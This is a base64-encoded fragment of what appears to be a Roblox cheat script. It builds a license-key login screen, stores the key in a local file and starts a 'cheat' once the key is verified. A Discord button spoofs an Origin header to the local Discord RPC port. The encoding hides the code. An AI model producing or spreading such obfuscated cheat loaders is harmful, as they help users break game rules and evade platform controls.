AwKX0pCiAgICAgICAgICAgIGxvY2FsIHRyYW5zcGFyZW5jeVR3ZWVuID0gVHdlZW5TZXJ2aWNlOkNyZWF0ZShPcGVuaW5nSW1hZ2UsIFR3ZWVuSW5mby5uZXcoMC41KSwge0ltYWdlVHJhbnNwYXJlbmN5ID0gMC40fSkKICAgICAgICAgICAgc2l6ZVR3ZWVuOlBsYXkoKTsgdHJhbnNwYXJlbmN5VHdlZW46UGxheSgpCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoU2tpcEJ0biwgVHdlZW5JbmZvLm5ldygxKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwLCBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMC44fSk6UGxheSgpCgogICAgICAgICAgICB0YXNrLndhaXQoMykKICAgICAgICAgICAgaWYgc2tpcHBlZCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIC0tIENsZWFudXAKICAgICAgICAgICAgVHdlZW5TZXJ2aWNlOkNyZWF0ZShCYWNrZ3JvdW5kLCBUd2VlbkluZm8ubmV3KDAuMyksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQogICAgICAgICAgICBUd2VlblNlcnZpY2U6Q3JlYXRlKE9wZW5pbmdJbWFnZSwgVHdlZW5JbmZvLm5ldygwLjUpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAxLCBTaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApfSk6UGxheSgpCiAgICAgICAgICAgIFR3ZWVuU2VydmljZTpDcmVhdGUoU2tpcEJ0biwgVHdlZW5JbmZvLm5ldygwLjUpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDEsIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCiAgICAgICAgICAgIAogICAgICAgICAgICB0YXNrLndhaXQoMC41KQogICAgICAgICAgICBjbGVhbnVwKCkKICAgICAgICAgICAgaWYgZ3VpVG9EZXN0cm95IHRoZW4gZ3VpVG9EZXN0cm95OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgU3RhcnRDaGVhdChkdXJhdGlvbiwga2V5U3RyaW5nLCB3aGl0ZWxpc3RlZCkKICAgICAgICBlbmQpCiAgICBlbmQKCiAgICBpZiBpc2ZpbGUgYW5kIHJlYWRmaWxlIGFuZCBpc2ZpbGUoIkN5YmVycHVua3NfS2V5LnR4dCIpIHRoZW4KICAgICAgICBsb2NhbCBzLCBrZXkgPSBwY2FsbChmdW5jdGlvbigpIHJldHVybiByZWFkZmlsZSgiQ3liZXJwdW5rc19LZXkudHh0IikgZW5kKQogICAgICAgIGlmIHMgYW5kIGtleSB0aGVuCiAgICAgICAgICAgIGxvY2FsIHZhbGlkLCBlcnIsIGR1ciwgd2wgPSBWZXJpZnlLZXkoa2V5KQogICAgICAgICAgICBpZiB2YWxpZCB0aGVuCiAgICAgICAgICAgICAgICBQbGF5QW5pbWF0aW9uKG5pbCwgZHVyLCBrZXksIHdsKQogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCgogICAgbG9jYWwgS2V5U3lzdGVtR3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQogICAgS2V5U3lzdGVtR3VpLk5hbWUgPSAiS2V5U3lzdGVtR1VJIgogICAgcGNhbGwoZnVuY3Rpb24oKSBLZXlTeXN0ZW1HdWkuUGFyZW50ID0gQ29yZUd1aSBlbmQpCiAgICBpZiBub3QgS2V5U3lzdGVtR3VpLlBhcmVudCB0aGVuIEtleVN5c3RlbUd1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKSBlbmQKCiAgICBsb2NhbCBLZXlGcmFtZSA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQogICAgS2V5RnJhbWUuTmFtZSA9ICJLZXlGcmFtZSIKICAgIEtleUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzIwLCAwLCAxODApCiAgICBLZXlGcmFtZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xNjAsIDAuNSwgLTkwKQogICAgS2V5RnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDE1LCAxNSwgMjApCiAgICBLZXlGcmFtZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBLZXlGcmFtZS5BY3RpdmUgPSB0cnVlCiAgICBLZXlGcmFtZS5EcmFnZ2FibGUgPSB0cnVlCiAgICBLZXlGcmFtZS5QYXJlbnQgPSBLZXlTeXN0ZW1HdWkKCiAgICBsb2NhbCBLZXlTdHJva2UgPSBJbnN0YW5jZS5uZXcoIlVJU3Ryb2tlIikKICAgIEtleVN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDQwLCA0MCwgNTApCiAgICBLZXlTdHJva2UuVGhpY2tuZXNzID0gMQogICAgS2V5U3Ryb2tlLlBhcmVudCA9IEtleUZyYW1lCgogICAgbG9jYWwgS2V5Q29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCiAgICBLZXlDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkKICAgIEtleUNvcm5lci5QYXJlbnQgPSBLZXlGcmFtZQoKICAgIGxvY2FsIEtleVRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQogICAgS2V5VGl0bGUuVGV4dCA9ICJBVVRIRU5USUNBVElPTiIKICAgIEtleVRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMCwgMzApCiAgICBLZXlUaXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQogICAgS2V5VGl0bGUuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyMDApCiAgICBLZXlUaXRsZS5Gb250ID0gRW51bS5Gb250LkdvdGhhbU1lZGl1bQogICAgS2V5VGl0bGUuVGV4dFNpemUgPSAxMQogICAgS2V5VGl0bGUuUGFyZW50ID0gS2V5RnJhbWUKCiAgICBsb2NhbCBLZXlJbnB1dCA9IEluc3RhbmNlLm5ldygiVGV4dEJveCIpCiAgICBLZXlJbnB1dC5TaXplID0gVURpbTIubmV3KDAuOSwgMCwgMCwgMzUpCiAgICBLZXlJbnB1dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA1LCAwLCAwLjI1LCAwKQogICAgS2V5SW5wdXQuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1LCAyNSwgMzApCiAgICBLZXlJbnB1dC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIEtleUlucHV0LlBsYWNlaG9sZGVyVGV4dCA9ICJMaWNlbnNlIEtleSIKICAgIEtleUlucHV0LlBsYWNlaG9sZGVyQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAwLCAxMDAsIDEwMCkKICAgIEtleUlucHV0LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBLZXlJbnB1dC5UZXh0U2l6ZSA9IDEwCiAgICBLZXlJbnB1dC5UZXh0ID0gIiIKICAgIEtleUlucHV0LlBhcmVudCA9IEtleUZyYW1lCgogICAgbG9jYWwgSW5wdXRDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIElucHV0Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICBJbnB1dENvcm5lci5QYXJlbnQgPSBLZXlJbnB1dAoKICAgIGxvY2FsIElucHV0U3Ryb2tlID0gSW5zdGFuY2UubmV3KCJVSVN0cm9rZSIpCiAgICBJbnB1dFN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDUwLCA1MCwgNjApCiAgICBJbnB1dFN0cm9rZS5UaGlja25lc3MgPSAxCiAgICBJbnB1dFN0cm9rZS5QYXJlbnQgPSBLZXlJbnB1dAoKICAgIGxvY2FsIFN1Ym1pdEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBTdWJtaXRCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAsIDMwKQogICAgU3VibWl0QnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDUsIDAsIDAuNSwgMCkKICAgIFN1Ym1pdEJ1dHRvbi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIFN1Ym1pdEJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTAsIDEwLCAxNSkKICAgIFN1Ym1pdEJ1dHRvbi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIFN1Ym1pdEJ1dHRvbi5UZXh0U2l6ZSA9IDEwCiAgICBTdWJtaXRCdXR0b24uVGV4dCA9ICJMT0dJTiIKICAgIFN1Ym1pdEJ1dHRvbi5QYXJlbnQgPSBLZXlGcmFtZQoKICAgIGxvY2FsIEJ1dHRvbkNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgQnV0dG9uQ29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICBCdXR0b25Db3JuZXIuUGFyZW50ID0gU3VibWl0QnV0dG9uCgogICAgbG9jYWwgRGlzY29yZEJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBEaXNjb3JkQnV0dG9uLlNpemUgPSBVRGltMi5uZXcoMC40MiwgMCwgMCwgMzApCiAgICBEaXNjb3JkQnV0dG9uLlBvc2l0aW9uID0gVURpbTIubmV3KDAuMDUsIDAsIDAuNywgMCkKICAgIERpc2NvcmRCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDg4LCAxMDEsIDI0MikKICAgIERpc2NvcmRCdXR0b24uVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCiAgICBEaXNjb3JkQnV0dG9uLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZAogICAgRGlzY29yZEJ1dHRvbi5UZXh0U2l6ZSA9IDkKICAgIERpc2NvcmRCdXR0b24uVGV4dCA9ICJESVNDT1JEIgogICAgRGlzY29yZEJ1dHRvbi5QYXJlbnQgPSBLZXlGcmFtZQoKICAgIGxvY2FsIERpc2NvcmRDb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgIERpc2NvcmRDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNCkKICAgIERpc2NvcmRDb3JuZXIuUGFyZW50ID0gRGlzY29yZEJ1dHRvbgoKICAgIGxvY2FsIEJ1eUJ1dHRvbiA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCiAgICBCdXlCdXR0b24uU2l6ZSA9IFVEaW0yLm5ldygwLjQyLCAwLCAwLCAzMCkKICAgIEJ1eUJ1dHRvbi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUzLCAwLCAwLjcsIDApCiAgICBCdXlCdXR0b24uQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDQ2LCAyMDQsIDExMykKICAgIEJ1eUJ1dHRvbi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKICAgIEJ1eUJ1dHRvbi5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKICAgIEJ1eUJ1dHRvbi5UZXh0U2l6ZSA9IDkKICAgIEJ1eUJ1dHRvbi5UZXh0ID0gIkJVWS9GUkVFIEtFWSIKICAgIEJ1eUJ1dHRvbi5QYXJlbnQgPSBLZXlGcmFtZQoKICAgIGxvY2FsIEJ1eUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQogICAgQnV5Q29ybmVyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDQpCiAgICBCdXlDb3JuZXIuUGFyZW50ID0gQnV5QnV0dG9uCgogICAgbG9jYWwgU3RhdHVzTGFiZWwgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCiAgICBTdGF0dXNMYWJlbC5TaXplID0gVURpbTIubmV3KDEsIDAsIDAsIDE1KQogICAgU3RhdHVzTGFiZWwuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMCwgMC45LCAwKQogICAgU3RhdHVzTGFiZWwuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKICAgIFN0YXR1c0xhYmVsLlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCkKICAgIFN0YXR1c0xhYmVsLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCiAgICBTdGF0dXNMYWJlbC5UZXh0U2l6ZSA9IDkKICAgIFN0YXR1c0xhYmVsLlRleHQgPSAiIgogICAgU3RhdHVzTGFiZWwuUGFyZW50ID0gS2V5RnJhbWUKCiAgICBEaXNjb3JkQnV0dG9uLk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHN1Y2Nlc3MgPSBjb3B5VG9DbGlwYm9hcmQoRElTQ09SRF9MSU5LKQogICAgICAgIGlmIHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICBEaXNjb3JkQnV0dG9uLlRleHQgPSAiQ09QSUVEISIKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgICAgIERpc2NvcmRCdXR0b24uVGV4dCA9ICJESVNDT1JEIgogICAgICAgIGVuZAogICAgICAgIC0tIEF0dGVtcHQgdG8gb3BlbiBEaXNjb3JkIHZpYSBsb2NhbCBSUEMKICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgIGxvY2FsIGh0dHAgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKICAgICAgICAgICAgaWYgcmVxdWVzdCB0aGVuCiAgICAgICAgICAgICAgICByZXF1ZXN0KHsKICAgICAgICAgICAgICAgICAgICBVcmwgPSAiaHR0cDovLzEyNy4wLjAuMTo2NDYzL3JwYz92PTEiLAogICAgICAgICAgICAgICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICAgICAgICAgICAgICBIZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iLAogICAgICAgICAgICAgICAgICAgICAgICBbIk9yaWdpbiJdID0gImh0dHBzOi8vZGlzY29yZC5jb20iCiAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICBCb2R5ID0gaHR0cDpKU09ORW5jb2RlKHsKICAgICAgICAgICAgICAgICAgICAgICAgY21kID0gIklOVklURV9CUk9XU0VSIiwKICAgICAgICAgICAgICAgICAgICAgICAgYXJncyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvZGUgPSAiVTNwdkFQTndEWCIKICAgICAgICAgICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgICAgICAgICAgbm9uY2UgPSBodHRwOkdlbmVyYXRlR1VJRChmYWxzZSkKICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kKQogICAgZW5kKQoKICAgIEJ1eUJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBsaW5rID0gQVVUSF9VUkwgLi4gIi9idXkiCiAgICAgICAgbG9jYWwgc3VjY2VzcyA9IGNvcHlUb0NsaXBib2FyZChsaW5rKQogICAgICAgIGlmIHN1Y2Nlc3MgdGhlbgogICAgICAgICAgICBCdXlCdXR0b24uVGV4dCA9ICJDT1BJRUQhIgogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICAgICAgQnV5QnV0dG9uLlRleHQgPSAiQlVZL0ZSRUUgS0VZIgogICAgICAgIGVuZAogICAgZW5kKQoKICAgIFN1Ym1pdEJ1dHRvbi5Nb3VzZUJ1dHRvbjFDbGljazpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBTdGF0dXNMYWJlbC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyMDAsIDApCiAgICAgICAgU3RhdHVzTGFiZWwuVGV4dCA9ICJDSEVDS0lORy4uLiIKICAgICAgICAKICAgICAgICBsb2NhbCBpc1ZhbGlkLCBlcnIsIGR1ciwgd2wgPSBWZXJpZnlLZXkoS2V5SW5wdXQuVGV4dCkKICAgICAgICAKICAgICAgICBpZiBpc1ZhbGlkIHRoZW4KICAgICAgICAgICAgaWYgd3JpdGVmaWxlIHRoZW4gd3JpdGVmaWxlKCJDeWJlcnB1bmtzX0tleS50eHQiLCBLZXlJbnB1dC5UZXh0KSBlbmQKICAgICAgICAgICAgU3RhdHVzTGFiZWwuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDI1NSwgMCkKICAgICAgICAgICAgU3RhdHVzTGFiZWwuVGV4dCA9ICJBQ0NFU1MgR1JBTlRFRCIKICAgICAgICAgICAgUGxheUFuaW1hdGlvbihLZXlTeXN0ZW1HdWksIGR1ciwgS2V5SW5wdXQuVGV4dCwgd2wpCiAgICAgICAgZWxzZQogICAgICAgICAgICBTdGF0dXNMYWJl" .. "bC5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCA1MCwgNTApCiAgICAgICAgICAgIFN0YXR1c0xhYmVsLlRleHQgPSAoZXJyIG9yICJJTlZBTElEIEtFWSIpCiAgICAgICAgICAgIEtleUlucHV0LlRleHQgPSAiIgogICAgICAgIGVuZAogICAgZW5kKQplbmQKCi0tID09PSBTTk9XIEVGRkVDVCA9PT0KX0cuU25vd0d1aSA9IG5pbApsb2NhbCBTbm93Q29ubmVjdGlvbnMgPSB7fQpsb2NhbCBTbm93RW5hYmxlZCA9IHRydWUKbG9jYWwgaXNTbm93QWN0aXZlID0gdHJ1ZSAtLSBUcmFjayBpZiBzbm93IHNob3VsZCBiZSBzaG93biAobm90IG1pbmltaXplZCkKCi0tIEN1c3RvbWl6YWJsZSBjb2xvcnMgKG1vZGlmeSB0aGVzZSB0byBjaGFuZ2UgY29sb3JzKQpfRy5Tbm93Rmxha2VDb2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpIC0tIFNub3dmbGFrZSBjb2xvciAoZGVmYXVsdDogd2hpdGUpCl9HLlNub3dCYWNrZ3JvdW5kQ29sb3IgPSBDb2xvcjMuZnJvbVJHQigxMCwgMTAsIDE1KSAtLSBCYWNrZ3JvdW5kIGNvbG9yIChkZWZhdWx0OiBkYXJrIGJsdWUvYmxhY2spCgpmdW5jdGlvbiB1cGRhdGVTbm93Q29sb3JzKCkKICAgIC0tIENyZWF0ZSBzbm93IGlmIGl0IGRvZXNuJ3QgZXhpc3QKICAgIGlmIG5vdCBfRy5Tbm93R3VpIHRoZW4gY3JlYXRlU25vdygpIGVuZAogICAgaWYgbm90IF9HLlNub3dHdWkgdGhlbiByZXR1cm4gZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBiYWNrZ3JvdW5kIGZyYW1lCiAgICBmb3IgXywgY2hpbGQgaW4gaXBhaXJzKF9HLlNub3dHdWk6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICBpZiBjaGlsZDpJc0EoIkZyYW1lIikgYW5kIGNoaWxkLk5hbWUgPT0gIkJhY2tncm91bmRGcmFtZSIgdGhlbgogICAgICAgICAgICBjaGlsZC5CYWNrZ3JvdW5kQ29sb3IzID0gX0cuU25vd0JhY2tncm91bmRDb2xvcgogICAgICAgIGVuZAogICAgZW5kCiAgICAKICAgIC0tIFVwZGF0ZSBnbG9iYWwgc25vd2ZsYWtlcyBhcnJheQogICAgaWYgX0cuU25vd2ZsYWtlcyB0aGVuCiAgICAgICAgZm9yIF8sIGZsYWtlIGluIGlwYWlycyhfRy5Tbm93Zmxha2VzKSBkbwogICAgICAgICAgICBpZiBmbGFrZS5mcmFtZSB0aGVuCiAgICAgICAgICAgICAgICBmbGFrZS5mcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gX0cuU25vd0ZsYWtlQ29sb3IKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgLS0gQWxzbyB1cGRhdGUgYW55IGV4aXN0aW5nIEdVSSBlbGVtZW50cwogICAgbG9jYWwgU25vd0NvbnRhaW5lciA9IF9HLlNub3dHdWk6RmluZEZpcnN0Q2hpbGQoIlNub3dDb250YWluZXIiKQogICAgaWYgU25vd0NvbnRhaW5lciB0aGVuCiAgICAgICAgZm9yIF8sIGNoaWxkIGluIGlwYWlycyhTbm93Q29udGFpbmVyOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiRnJhbWUiKSB0aGVuCiAgICAgICAgICAgICAgICBjaGlsZC5CYWNrZ3JvdW5kQ29sb3IzID0gX0cuU25vd0ZsYWtlQ29sb3IKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKZW5kCgpmdW5jdGlvbiBjcmVhdGVTbm93KCkKICAgIC0tIENsZWFuIHVwIGV4aXN0aW5nIHNub3cgZmlyc3QKICAgIGlmIF9HLlNub3dHdWkgdGhlbiBfRy5Tbm93R3VpOkRlc3Ryb3koKSBlbmQKICAgIF9HLlNub3dHdWkgPSBuaWwKICAgIF9HLlNub3dmbGFrZXMgPSBuaWwKICAgIAogICAgX0cuU25vd0d1aSA9IEluc3RhbmNlLm5ldygiU2NyZWVuR3VpIikKICAgIF9HLlNub3dHdWkuTmFtZSA9ICJDeWJlcnB1bmtzU25vdyIKICAgIF9HLlNub3dHdWkuSWdub3JlR3VpSW5zZXQgPSB0cnVlCiAgICBfRy5Tbm93R3VpLkVuYWJsZWQgPSBTbm93RW5hYmxlZCBhbmQgaXNTbm93QWN0aXZlCiAgICBfRy5Tbm93R3VpLkRpc3BsYXlPcmRlciA9IC0xIC0tIEVuc3VyZSBpdCBhcHBlYXJzIGJlaGluZCBhbGwgb3RoZXIgR1VJcwogICAgcGNhbGwoZnVuY3Rpb24oKSBfRy5Tbm93R3VpLlBhcmVudCA9IENvcmVHdWkgZW5kKQogICAgaWYgbm90IF9HLlNub3dHdWkuUGFyZW50IHRoZW4gX0cuU25vd0d1aS5QYXJlbnQgPSBwbGF5ZXI6V2FpdEZvckNoaWxkKCJQbGF5ZXJHdWkiKSBlbmQKICAgIAogICAgLS0gRGFyayBiYWNrZ3JvdW5kIG92ZXJsYXkKICAgIGxvY2FsIFNub3dCYWNrZ3JvdW5kID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICBTbm93QmFja2dyb3VuZC5OYW1lID0gIkJhY2tncm91bmRGcmFtZSIKICAgIFNub3dCYWNrZ3JvdW5kLlNpemUgPSBVRGltMi5uZXcoMSwgMCwgMSwgMCkKICAgIFNub3dCYWNrZ3JvdW5kLlBvc2l0aW9uID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBTbm93QmFja2dyb3VuZC5CYWNrZ3JvdW5kQ29sb3IzID0gX0cuU25vd0JhY2tncm91bmRDb2xvcgogICAgU25vd0JhY2tncm91bmQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDAuMyAtLSBTbGlnaHRseSBkYXJrCiAgICBTbm93QmFja2dyb3VuZC5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICBTbm93QmFja2dyb3VuZC5QYXJlbnQgPSBfRy5Tbm93R3VpCiAgICAKICAgIGxvY2FsIFNub3dDb250YWluZXIgPSBJbnN0YW5jZS5uZXcoIkZyYW1lIikKICAgIFNub3dDb250YWluZXIuTmFtZSA9ICJTbm93Q29udGFpbmVyIgogICAgU25vd0NvbnRhaW5lci5TaXplID0gVURpbTIubmV3KDEsIDAsIDEsIDApCiAgICBTbm93Q29udGFpbmVyLkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCiAgICBTbm93Q29udGFpbmVyLkNsaXBzRGVzY2VuZGFudHMgPSBmYWxzZSAtLSBBbGxvdyBzbm93IG91dHNpZGUgdGhlIGZyYW1lCiAgICBTbm93Q29udGFpbmVyLlBhcmVudCA9IF9HLlNub3dHdWkKICAgIAogICAgLS0gQ3JlYXRlIHNub3dmbGFrZXMKICAgIF9HLlNub3dmbGFrZXMgPSB7fQogICAgZm9yIGkgPSAxLCA4MCBkbyAtLSBTbm93Zmxha2VzIGZvciBmdWxsIHNjcmVlbiBjb3ZlcmFnZQogICAgICAgIGxvY2FsIGZsYWtlID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCiAgICAgICAgZmxha2UuU2l6ZSA9IFVEaW0yLm5ldygwLCBtYXRoLnJhbmRvbSg4LCAxNSksIDAsIG1hdGgucmFuZG9tKDgsIDE1KSkgLS0gU21hbGxlciBzbm93Zmxha2VzICg4LTE1cHgpCiAgICAgICAgZmxha2UuUG9zaXRpb24gPSBVRGltMi5uZXcobWF0aC5yYW5kb20oKSwgMCwgbWF0aC5yYW5kb20oKSwgMCkKICAgICAgICBmbGFrZS5CYWNrZ3JvdW5kQ29sb3IzID0gX0cuU25vd0ZsYWtlQ29sb3IKICAgICAgICBmbGFrZS5Cb3JkZXJTaXplUGl4ZWwgPSAwCiAgICAgICAgZmxha2UuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IG1hdGgucmFuZG9tKDAuMywgMC42KSAtLSBTbGlnaHRseSBtb3JlIG9wYXF1ZSBmb3IgdmlzaWJpbGl0eQogICAgICAgIGZsYWtlLlBhcmVudCA9IFNub3dDb250YWluZXIKICAgICAgICAKICAgICAgICBsb2NhbCBjb3JuZXIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKICAgICAgICBjb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMC41LCAwKSAtLSBQZXJmZWN0bHkgcm91bmQgY2lyY2xlCiAgICAgICAgY29ybmVyLlBhcmVudCA9IGZsYWtlCiAgICAgICAgCiAgICAgICAgdGFibGUuaW5zZXJ0KF9HLlNub3dmbGFrZXMsIHsKICAgICAgICAgICAgZnJhbWUgPSBmbGFrZSwKICAgICAgICAgICAgeCA9IG1hdGgucmFuZG9tKCkgKiAxMDAsIC0tIFN0YXJ0IGFueXdoZXJlIG9uIFggYXhpcyAoZnVsbCB3aWR0aCkKICAgICAgICAgICAgeSA9IG1hdGgucmFuZG9tKCkgKiAxMDAsIC0tIFN0YXJ0IGFueXdoZXJlIG9uIFkgYXhpcyAoZnVsbCBoZWlnaHQpCiAgICAgICAgICAgIHNwZWVkID0gbWF0aC5yYW5kb20oKSAqIDAuMDMgKyAwLjAyLCAtLSBHZW50bGUgZmFsbCBzcGVlZAogICAgICAgIH0pCiAgICBlbmQKICAgIAogICAgLS0gQW5pbWF0ZSBzbm93CiAgICBsb2NhbCBzbm93Q29ubmVjdGlvbiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICBpZiBub3QgX0cuU25vd0d1aSBvciBub3QgX0cuU25vd0d1aS5FbmFibGVkIG9yIG5vdCBpc1Nub3dBY3RpdmUgdGhlbiByZXR1cm4gZW5kCiAgICAgICAgCiAgICAgICAgZm9yIF8sIGZsYWtlIGluIGlwYWlycyhfRy5Tbm93Zmxha2VzIG9yIHt9KSBkbwogICAgICAgICAgICBmbGFrZS55ID0gZmxha2UueSArIGZsYWtlLnNwZWVkIC0tIEZhbGwgZG93biB2ZXJ5IHNsb3dseQogICAgICAgICAgICAKICAgICAgICAgICAgLS0gUmVzZXQgd2hlbiBzbm93Zmxha2UgZ29lcyBvZmYgc2NyZWVuCiAgICAgICAgICAgIGlmIGZsYWtlLnkgPiAxMDUgdGhlbgogICAgICAgICAgICAgICAgZmxha2UueSA9IC01CiAgICAgICAgICAgICAgICBmbGFrZS54ID0gbWF0aC5yYW5kb20oKSAqIDEwMCAtLSBTdGFydCBmcm9tIHJhbmRvbSBYIHBvc2l0aW9uIChmdWxsIHdpZHRoKQogICAgICAgICAgICBlbmQKICAgICAgICAgICAgCiAgICAgICAgICAgIGZsYWtlLmZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KGZsYWtlLnggLyAxMDAsIDAsIGZsYWtlLnkgLyAxMDAsIDApCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIHRhYmxlLmluc2VydChTbm93Q29ubmVjdGlvbnMsIHNub3dDb25uZWN0aW9uKQplbmQKCmNyZWF0ZVNub3coKQp1cGRhdGVTbm93Q29sb3JzKCkKCi0tIEZ1bmN0aW9uIHRvIGNoYW5nZSBzbm93IGNvbG9ycyAoY2FsbCB0aGlzIHRvIGN1c3RvbWl6ZSkKLS0gRXhhbXBsZTogX0cuU2V0U25vd0NvbG9ycyhDb2xvcjMuZnJvbVJHQigyNTUsIDIwMCwgMTAwKSwgQ29sb3IzLmZyb21SR0IoMCwgMCwgNTApKQpfRy5TZXRTbm93Q29sb3JzID0gZnVuY3Rpb24oZmxha2VDb2xvciwgYmFja2dyb3VuZENvbG9